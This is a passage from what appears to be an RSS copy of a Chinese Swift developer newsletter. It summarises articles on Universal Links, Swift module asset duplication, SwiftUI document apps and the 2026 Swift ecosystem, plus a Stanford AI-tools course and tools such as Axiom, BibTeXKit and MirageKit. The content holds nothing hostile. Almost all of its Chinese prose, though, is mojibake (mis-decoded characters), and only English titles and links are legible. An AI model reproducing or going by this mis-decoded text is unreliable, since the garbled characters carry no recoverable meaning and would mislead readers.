<p>Universal Links çš„åŸç†å’Œå®ç°æœ¬èº«å¹¶ä¸å¤æ‚ï¼Œä¹Ÿå› æ­¤å¸¸å¸¸ç»™äººä¸€ç§â€œç®€å•è€Œä¼˜é›…â€çš„é”™è§‰ã€‚ä½†ä¸€æ—¦è¿›å…¥å¤§è§„æ¨¡åº”ç”¨ã€å¤šä¸ªåŸŸåã€å¤æ‚è·¯ç”±å’Œé•¿æœŸæ¼”è¿›çš„çœŸå®åœºæ™¯ï¼Œå…¶å¤æ‚åº¦ä¼šè¿…é€Ÿæ˜¾ç°ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Falbertodebo" target="_blank" title="https://x.com/albertodebo" ref="nofollow noopener noreferrer">Alberto De Bortoli</a> ç»“åˆè‡ªèº«åœ¨å¤§å‹é¡¹ç›®ä¸­çš„å®è·µç»éªŒï¼Œç³»ç»Ÿæ¢³ç†äº† Universal Links åœ¨è§„æ¨¡åŒ–ä½¿ç”¨æ—¶å¸¸è¢«å¿½è§†çš„é—®é¢˜ï¼šAASA æ–‡ä»¶çš„ç»´æŠ¤æˆæœ¬ã€ç¼“å­˜ä¸ç”Ÿæ•ˆæ—¶æœºçš„ä¸ç¡®å®šæ€§ã€å¤šç¯å¢ƒä¸å¤šå›¢é˜Ÿåä½œä¸‹çš„é£é™©ï¼Œä»¥åŠè°ƒè¯•ä¸å›æ»šå‡ ä¹æ²¡æœ‰â€œå®‰å…¨ç½‘â€çš„ç°å®å›°å¢ƒã€‚Alberto æé†’å¼€å‘è€…åœ¨è®¾è®¡æ·±åº¦é“¾æ¥æ–¹æ¡ˆæ—¶ï¼Œå¿…é¡»æå‰ä¸ºâ€œè§„æ¨¡æ•ˆåº”â€åšå¥½å‡†å¤‡ã€‚</p>
<hr/>
<h3 data-id="heading-6"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-03" target="_blank" title="https://l.fatbobman.com/w0119-03" ref="nofollow noopener noreferrer">å½“æ¨¡å—åŒ–é‡åˆ°èµ„æºé‡å¤é—®é¢˜ (Swift Modules and Code/Assets Duplication)</a></h3>
<p>éšç€ Swift æ¨¡å—åŒ–ç¨‹åº¦çš„ä¸æ–­åŠ æ·±ï¼Œèµ„æºï¼ˆCodeAssetsï¼‰ç®¡ç†é€æ¸æˆä¸ºä¸€ä¸ªå®¹æ˜“è¢«å¿½è§†ã€å´å¯èƒ½åœ¨è§„æ¨¡åŒ–é¡¹ç›®ä¸­å¼•å‘å®é™…é—®é¢˜çš„é¢†åŸŸã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fpfandrade_" target="_blank" title="https://x.com/pfandrade_" ref="nofollow noopener noreferrer">Paulo Andrade</a> é€šè¿‡å…·ä½“ç¤ºä¾‹åˆ†æäº† Swift æ¨¡å—ä¸ CodeAssets åœ¨å¤šæ¨¡å—ä¾èµ–åœºæ™¯ä¸‹äº§ç”Ÿé‡å¤æ‰“åŒ…ä¸ä½“ç§¯è†¨èƒ€çš„é—®é¢˜ï¼Œè§£é‡Šäº†å…¶èƒŒåçš„æ„å»ºä¸é“¾æ¥æœºåˆ¶ï¼Œå¹¶æ¢è®¨äº†å½“å‰å·¥å…·é“¾ä¸‹å¯è¡Œçš„è§„é¿ç­–ç•¥ã€‚Paulo æé†’å¼€å‘è€…ï¼šæ¨¡å—åŒ–å¹¶ä¸ä»…ä»…æ˜¯ API ä¸ä¾èµ–å…³ç³»çš„è®¾è®¡ï¼Œèµ„æºçš„è¾¹ç•Œä¸å½’å±åŒæ ·éœ€è¦è¢«è®¤çœŸå¯¹å¾…ã€‚</p>
<hr/>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-04" target="_blank" title="https://l.fatbobman.com/w0119-04" ref="nofollow noopener noreferrer">ä½¿ç”¨ SwiftUI æ„å»ºæ–‡æ¡£å‹åº”ç”¨ (Crafting document-based apps in SwiftUI)</a></h3>
<p>æ–‡æ¡£å‹åº”ç”¨ï¼ˆDocument-Based Appï¼‰æ˜¯ä¸€ä¸ªæ—¢å¸¸è§ã€å´å¸¸è¢«ä½ä¼°å¤æ‚åº¦çš„åº”ç”¨å½¢æ€ã€‚ç›¸æ¯”æ™®é€šåº”ç”¨ï¼Œå…¶æ–‡ä»¶ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€æƒé™ä¸å®‰å…¨ä½œç”¨åŸŸï¼Œä»¥åŠä¸ç³»ç»Ÿæ–‡æ¡£æµè§ˆä½“éªŒçš„ååŒæ–¹å¼ï¼Œå¯¹ä¸å°‘å¼€å‘è€…è€Œè¨€éƒ½è¾ƒä¸ºé™Œç”Ÿã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.linkedin.com%2Fin%2Ffonztara%2F" target="_blank" title="https://www.linkedin.com/in/fonztara/" ref="nofollow noopener noreferrer">Alfonso Tarallo</a> ä»¥ SwiftUI ä¸ºæ ¸å¿ƒï¼Œç³»ç»Ÿæ¢³ç†äº†æ„å»ºæ–‡æ¡£å‹åº”ç”¨æ‰€éœ€çš„å…³é”®ç»„æˆéƒ¨åˆ†ï¼ŒåŒ…æ‹¬ <code>FileDocument</code>ã€<code>DocumentGroup</code> çš„èŒè´£åˆ’åˆ†ï¼Œä»¥åŠ SwiftUI å¦‚ä½•ä¸ç³»ç»Ÿæ–‡ä»¶æœºåˆ¶ååŒå·¥ä½œã€‚</p>
<hr/>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-05" target="_blank" title="https://l.fatbobman.com/w0119-05" ref="nofollow noopener noreferrer">Swift 2026 ç”Ÿæ€ç°çŠ¶ (State of Swift 2026)</a></h3>
<p>è¿™æ˜¯ä¸€ç¯‡å›´ç»• Swift ç”Ÿæ€çš„æ·±åº¦è§‚å¯Ÿä¸è¶‹åŠ¿ç ”åˆ¤ã€‚æ–‡ç« å°† 2025 å¹´å®šä¹‰ä¸º Swift çš„â€œå˜é©ä¹‹å¹´â€ï¼Œè¯¦ç»†æ¢³ç†äº†å¹¶å‘æ¨¡å‹ä»â€œä¸¥æ ¼â€å‘â€œå¹³æ˜“è¿‘äººï¼ˆApproachableï¼‰â€çš„æ¼”è¿›è·¯å¾„ï¼Œä»¥åŠæœåŠ¡ç«¯ï¼ˆå¦‚ Apple å¯†ç æœåŠ¡è¿ç§»æ¡ˆä¾‹ï¼‰ä¸ Android å¼€å‘çš„å®è´¨æ€§çªç ´ã€‚ä½œè€…æ²¡æœ‰å›é¿ç¤¾åŒºå…³äº SwiftUI ä¸ AppKit çš„æ¶æ„äº‰è®®ï¼Œè€Œæ˜¯å®¢è§‚åˆ†æäº†å…¶ä¸­çš„æœºé‡ä¸æŒ‘æˆ˜ã€‚ç›¸æ¯”äºå•çº¯çš„æŠ€æœ¯æ¸…å•ï¼Œæœ¬æ–‡æ›´åƒæ˜¯ä¸€ä»½æˆ˜ç•¥æŠ¥å‘Šï¼Œå¸®åŠ©å¼€å‘è€…åœ¨æ—¥å¸¸ä»£ç ä¹‹å¤–ï¼Œçœ‹æ¸… Swift æ­£ä»å•ä¸€çš„â€œApp è¯­è¨€â€å‘å…¨åœºæ™¯å®‰å…¨è¯­è¨€èœ•å˜çš„å®è§‚å›¾æ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-9"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-06" target="_blank" title="https://l.fatbobman.com/w0119-06" ref="nofollow noopener noreferrer">å’Œ ChaoCode ä¸€èµ·å­¦ CS146S</a></h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fthemodernsoftware.dev%2F" target="_blank" title="https://themodernsoftware.dev/" ref="nofollow noopener noreferrer">CS146S</a> æ˜¯æ–¯å¦ç¦å¤§å­¦å¼€è®¾çš„ä¸€é—¨å‰æ²¿è®¡ç®—æœºç§‘å­¦è¯¾ç¨‹ï¼Œå…¨åä¸º "CS146S: The Modern Software Developer"ã€‚è¯¥è¯¾ç¨‹çš„æ ¸å¿ƒç†å¿µåœ¨äºæ•™å¯¼å­¦ç”Ÿåˆ©ç”¨æœ€æ–°çš„ AI å·¥å…·ï¼ˆå¦‚ LLMsã€Cursorã€Claude ç­‰ï¼‰å°†å¼€å‘æ•ˆç‡æå‡ 10 å€ï¼Œä»å•çº¯çš„â€œä»£ç ç¼–å†™è€…â€è½¬å˜ä¸ºâ€œAI æ™ºèƒ½ä½“çš„æŒ‡æŒ¥å®˜â€ã€‚</p>
<p>å¦‚æœä½ å¯¹è¿™é—¨è¯¾ç¨‹æ„Ÿå…´è¶£ï¼Œä½†é¢å¯¹å¤§é‡çš„è‹±æ–‡é˜…è¯»ææ–™å’Œçº¯æ–‡æœ¬ Slides æ„Ÿåˆ°æ¯ç‡¥æˆ–ç•éš¾ï¼Œé‚£ä¹ˆ <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fjanechao_dev" target="_blank" title="https://x.com/janechao_dev" ref="nofollow noopener noreferrer">ChaoCode</a> (Jane) åˆšåˆšå¼€å¯çš„è¿™ä¸ªâ€œä¼´è¯»â€ç³»åˆ—å¯èƒ½æ­£æ˜¯ä½ éœ€è¦çš„ã€‚Jane ä»¥â€œè§†è§‰å­¦ä¹ è€…â€çš„è§†è§’ï¼Œé€šè¿‡è§†é¢‘å½¢å¼è®°å½•å¹¶åˆ†äº«äº†è¿™é—¨è¯¾ç¨‹çš„å­¦ä¹ è¿‡ç¨‹ã€‚å¥¹ä¸ä»…å°†åŸå§‹ Slides æ•´ç†æˆäº†ç¹ä½“ä¸­æ–‡/è‹±æ–‡åŒè¯­ç‰ˆæœ¬ï¼Œè¡¥å……äº†åŸç‰ˆç¼ºå¤±çš„è®²è€…æ³¨é‡Šï¼Œè¿˜ä¸“é—¨ç»´æŠ¤äº†ä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fchaocode.notion.site%2Fcs146s" target="_blank" title="https://chaocode.notion.site/cs146s" ref="nofollow noopener noreferrer">Notion é¡µé¢</a> æ¥æ•´åˆæ‰€æœ‰çš„å­¦ä¹ èµ„æºä¸ä½œä¸šã€‚è¿™ä¸æ˜¯ä¸€ä¸ªè¯¾ç¨‹æ¬è¿ï¼Œè€Œæ˜¯ä¸€ä¸ªâ€œLearning in Publicâ€çš„æœ€ä½³å®è·µã€‚</p>
<h2 data-id="heading-10">å·¥å…·</h2>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-07" target="_blank" title="https://l.fatbobman.com/w0119-07" ref="nofollow noopener noreferrer">Axiomï¼šé¢å‘ iOS å¼€å‘çš„ Claude Code Agent é›†åˆ</a></h3>
<p>Axiom æ˜¯ç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fbsky.app%2Fprofile%2Fwiltgen.net" target="_blank" title="https://bsky.app/profile/wiltgen.net" ref="nofollow noopener noreferrer">Charles Wiltgen</a> ç»´æŠ¤çš„ä¸€å¥—é¢å‘ iOS å¼€å‘è€…çš„ Claude Code Agents ä¸ Skills çŸ¥è¯†ä½“ç³»ã€‚å®ƒå°†å¤§é‡çœŸå®é¡¹ç›®ä¸­åå¤å‡ºç°çš„å¼€å‘ä»»åŠ¡ã€æ’éšœæµç¨‹ä¸æœ€ä½³å®è·µï¼Œç³»ç»Ÿæ•´ç†ä¸ºå¯å¤ç”¨çš„ Skillsã€Agents ä¸ Commandsï¼Œè¦†ç›– Swift 6ã€SwiftUIã€å¹¶å‘ã€æ•°æ®æŒä¹…åŒ–ã€è°ƒè¯•ã€å¯è®¿é—®æ€§ä»¥åŠ Apple Intelligence ç­‰å¤šä¸ªæ–¹å‘ã€‚</p>
<p>Axiom å°è¯•å›ç­”å¦ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•æŠŠç»éªŒä¸°å¯Œçš„å·¥ç¨‹åˆ¤æ–­ï¼Œç³»ç»ŸåŒ–åœ°äº¤ç»™ AI åŠ©æ‰‹æ‰§è¡Œã€‚ä½œè€…ä¹Ÿé¼“åŠ±ä½¿ç”¨è€…åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reddit.com%2Fr%2Faxiomdev%2F" target="_blank" title="https://www.reddit.com/r/axiomdev/" ref="nofollow noopener noreferrer">Reddit çš„ axiomdev æ¿å—</a> ä¸­äº¤æµå®è·µç»éªŒä¸åé¦ˆã€‚</p>
<hr/>
<h3 data-id="heading-12"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-08" target="_blank" title="https://l.fatbobman.com/w0119-08" ref="nofollow noopener noreferrer">BibTeXKitï¼šç±»å‹å®‰å…¨çš„ BibTeX è§£æåº“</a></h3>
<p>BibTeX æ–‡ä»¶æ˜¯ä¸€ç§åŸºäºæ–‡æœ¬çš„æ–‡çŒ®æ•°æ®åº“æ ¼å¼ï¼Œå¹¿æ³›ç”¨äº LaTeX æ–‡æ¡£ä½“ç³»ä¸­ç®¡ç†å‚è€ƒæ–‡çŒ®ã€‚é€šè¿‡ç»´æŠ¤ç‹¬ç«‹çš„ <code>.bib</code> æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é›†ä¸­å­˜å‚¨å¹¶å¤ç”¨æ–‡çŒ®çš„å…ƒæ•°æ®ï¼Œåœ¨æ’ç‰ˆé˜¶æ®µç”±å·¥å…·è‡ªåŠ¨å®Œæˆå¼•ç”¨ä¸æ ¼å¼åŒ–ã€‚</p>
<p>ç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.linkedin.com%2Fin%2Fezefranca%2F" target="_blank" title="https://www.linkedin.com/in/ezefranca/" ref="nofollow noopener noreferrer">Ezequiel Santos</a> å¼€å‘çš„ BibTeXKit æ˜¯ä¸€ä¸ªä½¿ç”¨ Swift ç¼–å†™çš„ BibTeX è§£æä¸å»ºæ¨¡åº“ï¼Œç›®æ ‡éå¸¸æ˜ç¡®ï¼šä¸º Swift é¡¹ç›®æä¾›ä¸€å¥—ç±»å‹å®‰å…¨ã€å¯æ‰©å±•çš„ BibTeX å¤„ç†èƒ½åŠ›ã€‚å®ƒå°† BibTeX æ–‡ä»¶ä¸­çš„æ¡ç›®ã€å­—æ®µä¸å¼•ç”¨å…³ç³»æ˜ å°„ä¸ºæ¸…æ™°çš„ Swift æ•°æ®ç»“æ„ï¼Œé¿å…äº†åœç•™åœ¨å­—ç¬¦ä¸²å±‚é¢åå¤è§£æä¸æ‰‹å·¥å¤„ç†æ‰€å¸¦æ¥çš„å¤æ‚æ€§ï¼Œæ›´é€‚åˆä½œä¸ºæ–‡çŒ®ç®¡ç†ç±»å·¥å…·æˆ–ç ”ç©¶å‹åº”ç”¨çš„åº•å±‚ç»„ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-13"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-09" target="_blank" title="https://l.fatbobman.com/w0119-09" ref="nofollow noopener noreferrer">MirageKitï¼šApple å¹³å°é«˜æ€§èƒ½æŠ•å±ä¸è¿œç¨‹æ§åˆ¶æ¡†æ¶</a></h3>
<p>MirageKit æ˜¯ä¸€ä¸ªç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FEthanLipnik" target="_blank" title="https://x.com/EthanLipnik" ref="nofollow noopener noreferrer">Ethan Lipnik</a> å¼€å‘çš„ Apple å¹³å°ä¸“ç”¨æµåª’ä½“æ¡†æ¶ï¼Œæ—¨åœ¨å®ç° macOS ç”»é¢å‘ iOSã€visionOS æˆ–å¦ä¸€å° Mac çš„ä½å»¶è¿ŸæŠ•å±ä¸æ§åˆ¶ã€‚</p>
<p>è¯¥æ¡†æ¶å……åˆ†åˆ©ç”¨äº† Apple æœ€æ–°çš„ç³»ç»Ÿç‰¹æ€§ï¼ˆéœ€ iOS 26+ / macOS 26+ï¼‰ï¼Œæ ¸å¿ƒåŸºäº ScreenCaptureKit ä¸ Metal æ„å»ºï¼Œåˆ©ç”¨ UDP ä¼ è¾“è§†é¢‘æµå¹¶æ”¯æŒ AWDL ç‚¹å¯¹ç‚¹è¿æ¥ï¼Œåœ¨ä¿è¯ç”»è´¨ï¼ˆæ”¯æŒ 1:1 è™šæ‹Ÿæ˜¾ç¤ºå™¨åƒç´ çº§æ¸²æŸ“ï¼‰çš„åŒæ—¶å®ç°äº†æä½çš„å»¶è¿Ÿã€‚é™¤äº†å•çº¯çš„ç”»é¢ä¼ è¾“ï¼ŒMirageKit è¿˜æ‰“é€šäº†è¾“å…¥åå‘æ§åˆ¶ï¼Œæ”¯æŒå°†å®¢æˆ·ç«¯çš„é”®é¼ ã€æ‰‹åŠ¿æ“ä½œç”šè‡³åŸç”Ÿèœå•æ äº¤äº’å›ä¼ è‡³ä¸»æœºã€‚å¯¹äºæƒ³è¦æ„å»ºé«˜æ€§èƒ½è¿œç¨‹æ¡Œé¢ã€å‰¯å±åº”ç”¨æˆ– Vision Pro ç”Ÿäº§åŠ›å·¥å…·çš„å¼€å‘è€…æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ½œåŠ›çš„èµ·æ­¥æ–¹æ¡ˆã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMirageKit ç›®å‰ä»å¤„äº <strong>æ—©æœŸä¸”æ´»è·ƒçš„å¼€å‘é˜¶æ®µ</strong>ï¼ŒAPI å¯èƒ½ä¼šå‡ºç°ç ´åæ€§å˜æ›´ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FEthanLipnik%2Fstatus%2F2012298013558063499" target="_blank" title="https://x.com/EthanLipnik/status/2012298013558063499" ref="nofollow noopener noreferrer">æ¨æ–‡</a> ä¸­å±•ç¤ºçš„è§†é¢‘ï¼Œæ˜¯ Ethan åŸºäº MirageKit æ„å»ºã€ä»åœ¨å¼€å‘ä¸­çš„åº”ç”¨æ¼”ç¤ºã€‚</p>
<h2 data-id="heading-14">å¾€æœŸå†…å®¹</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-118%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-118/" ref="nofollow noopener noreferrer">AT çš„äººç”Ÿæœªå¿…æ¯” MT æ›´å¥½- #118</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhttps%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-117%2F" target="_blank" title="https://https://fatbobman.com/zh/weekly/issue-117/" ref="nofollow noopener noreferrer">2026ï¼šå½“ AI éšå…¥å·¥ä½œæµï¼Œä½ å‡†å¤‡å¥½äº†å—ï¼Ÿ- #117</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-116%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-116/" ref="nofollow noopener noreferrer">Swiftã€SwiftUI ä¸ SwiftDataï¼šèµ°å‘æˆç†Ÿçš„ 2025 - #116</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-115%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-115/" ref="nofollow noopener noreferrer">å‘¨æ—¥å°æ’æ›² - #115</a></li>
</ul>
<h2 data-id="heading-15">ğŸ’ æ”¯æŒä¸åé¦ˆ</h2>
<p>å¦‚æœæœ¬æœŸå‘¨æŠ¥å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè¯·ï¼š</p>
<ul>
<li>ğŸ‘ <strong>ç‚¹èµ</strong> - è®©æ›´å¤šå¼€å‘è€…çœ‹åˆ°</li>
<li>ğŸ’¬ <strong>è¯„è®º</strong> - åˆ†äº«ä½ çš„çœ‹æ³•æˆ–é—®é¢˜</li>
<li>ğŸ”„ <strong>è½¬å‘</strong> - å¸®åŠ©åŒè¡Œå…±åŒæˆé•¿</li>
</ul>
<hr/>
<blockquote>
<p>ğŸš€ <strong>æ‹“å±• Swift è§†é‡</strong></p>
<ul>
<li><strong>ğŸ“® é‚®ä»¶è®¢é˜…</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fweekly.fatbobman.com%2Fwelcome" target="_blank" title="https://weekly.fatbobman.com/welcome" ref="nofollow noopener noreferrer">weekly.fatbobman.com</a> è·å–ç‹¬å®¶æŠ€æœ¯æ´å¯Ÿ</li>
<li><strong>ğŸ‘¥ å¼€å‘è€…ç¤¾åŒº</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Finvite%2F7FedN5E2QQ" target="_blank" title="https://discord.com/invite/7FedN5E2QQ" ref="nofollow noopener noreferrer">Discord</a> å®æ—¶äº¤æµå¼€å‘ç»éªŒ</li>
<li><strong>ğŸ“š åŸåˆ›æ•™ç¨‹</strong> | <a href="https://link.juejin.cn?target=http%3A%2F%2Ffatbobman.com" target="_blank" title="http://fatbobman.com" ref="nofollow noopener noreferrer">fatbobman.com</a> å­¦ä¹  Swift/SwiftUI æœ€ä½³å®è·µ</li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>